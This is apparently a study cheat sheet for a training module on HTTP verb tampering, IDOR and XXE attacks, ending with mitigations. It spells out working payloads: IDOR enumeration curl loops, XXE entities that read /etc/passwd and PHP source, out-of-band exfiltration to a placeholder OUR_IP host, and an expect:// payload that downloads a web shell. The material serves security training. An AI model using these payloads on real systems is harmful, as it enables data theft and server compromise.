# Web Attacks

## 🎯 Main Idea
- Covers three high-impact web attack classes: HTTP Verb Tampering, IDOR, and XXE.
- `Verb Tampering` abuses unprotected/alternate HTTP methods; `IDOR` abuses broken object-level access control; `XXE` abuses unsafe XML parsing of external entities.
- Each can lead to auth/filter bypass, sensitive data disclosure, privilege escalation, or remote code execution.

## 💥 Attack / Exploit Vectors

### HTTP Verb Tampering — Bypassing Basic Authentication
- Auth configs that restrict only specific verbs (e.g. `<Limit GET>`) leave other methods (`POST`, `HEAD`, `OPTIONS`) unauthenticated.
- Send the request with an unlisted method to reach protected functionality.
- **Commands**
  - `-X OPTIONS` — set HTTP method with curl (e.g. `curl -X OPTIONS ...`)

### HTTP Verb Tampering — Bypassing Security Filters
- Filters that inspect only one method (e.g. `$_POST['param']`) are bypassed by switching the request method (e.g. GET), while the sink uses `$_REQUEST`.
- Enables reaching underlying bugs (e.g. command injection) the filter was protecting.
- **Commands**
  - Burp → `Change Request Method` — flip GET/POST to dodge the filter, then confirm injection (e.g. `file1; touch file2;`)

### IDOR — Identifying References
- Look for direct object references in URL parameters, APIs, and AJAX calls.
- Analyze how references are hashed/encoded and compare behavior across user roles.
- **Commands**
  - `md5sum` — hash candidate values to match an object reference
  - `base64` — encode/decode reference values

### IDOR — Mass Enumeration
- Iterate predictable references (e.g. `uid=1..N`) in a script to harvest other users' data/files.
- **Commands**
  - `for i in {1..10}; do curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php; done` — loop to download all objects

### IDOR — Bypassing Encoded/Hashed References
- Hashed references look secure but are reversible if the hashing is done client-side (exposed JS function).
- Replicate the front-end logic (e.g. `md5(base64(uid))`) to forge valid references.
- **Commands**
  - `echo -n 1 | base64 -w 0 | md5sum` — reproduce a `CryptoJS.MD5(btoa(uid))` reference
  - `for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done` — generate reference hashes for mass enumeration

### IDOR — Insecure APIs
- APIs lacking back-end authorization let you read (`GET`) or modify (`PUT`/`POST`/`DELETE`) other users' objects by changing the id.
- Leaks hidden fields (e.g. `uuid`, `role`) needed for further tampering.

### IDOR — Chaining Vulnerabilities
- Combine IDOR info disclosure (leak uuid/role) with insecure function calls to escalate.
- Follow-on attacks: change a victim's email then trigger password reset, store XSS in profile fields, set own `role` to admin, mass-assign changes to all users.

### XXE — Local File Disclosure
- Unfiltered XML lets you define external entities that read server files; inject the entity into a reflected element.
- **Commands**
  - `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — external entity pointing to a local file
  - `<!ENTITY company "Inlane Freight">` — internal entity to confirm injection (reference via `&company;`)
  - `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` — external entity pointing to a URL

### XXE — Reading Source Code
- Source files with XML-special chars break raw inclusion; base64-encode them with a PHP filter (PHP apps only).
- **Commands**
  - `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` — read PHP source base64-encoded

### XXE — Advanced File Disclosure (CDATA)
- Wrap non-XML content in `CDATA` using external parameter entities joined via an external DTD (framework-agnostic).
- **Commands**
  - `<!ENTITY % begin "<![CDATA[">` / `<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">` / `<!ENTITY % end "]]>">` — CDATA-wrap a file
  - `<!ENTITY joined "%begin;%file;%end;">` — join in a hosted `xxe.dtd` and reference `&joined;`

### XXE — Error-Based Disclosure
- When output isn't reflected but runtime errors are shown, leak file contents through a parser error message.
- **Commands**
  - `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` — force file content into an error

### XXE — Blind / OOB Data Exfiltration
- Fully blind: exfiltrate base64 file content to an attacker server via an out-of-band HTTP (or DNS) request.
- **Commands**
  - `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">` — base64-encode target file
  - `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` — exfiltrate via OOB request
  - `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter` — automate OOB exfiltration

### XXE — Remote Code Execution
- Via `expect://` (if module enabled) or fetching a hosted PHP web shell to the server.
- **Commands**
  - `<!ENTITY company SYSTEM "expect://id">` — run a command via the expect wrapper
  - `<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">` — download a web shell (`$IFS` replaces spaces)

## 🛠️ Key Tools & Concepts
- **curl / Burp Suite** — craft verb-tampering, IDOR, and XXE requests; `Change Request Method`, Comparer, Inspector.
- **XXEinjector** — automates basic/CDATA/error-based/blind OOB XXE.
- **PHP filters & wrappers** — `php://filter` (base64 source read), `php://input`, `expect://`.
- **XML entities** — internal vs external vs parameter (`%`) entities; external DTD hosting for joining.
- **RBAC / object references** — IDOR root cause is missing object-level access control.

## 🛡️ Mitigations
- **Verb Tampering** — never limit auth/filters to specific verbs; use `LimitExcept`/`http-method-omission`; test all params (`$_REQUEST`); disable unused methods (e.g. HEAD).
- **IDOR** — enforce back-end object-level access control (RBAC) from the session, not client input; use unpredictable references (UUID v4); never hash references on the front-end.
- **XXE** — update XML libraries/components; disable DTDs, external entities, parameter entities, and XInclude; prevent entity reference loops; disable runtime error display; prefer JSON/YAML; use a WAF as an extra layer.
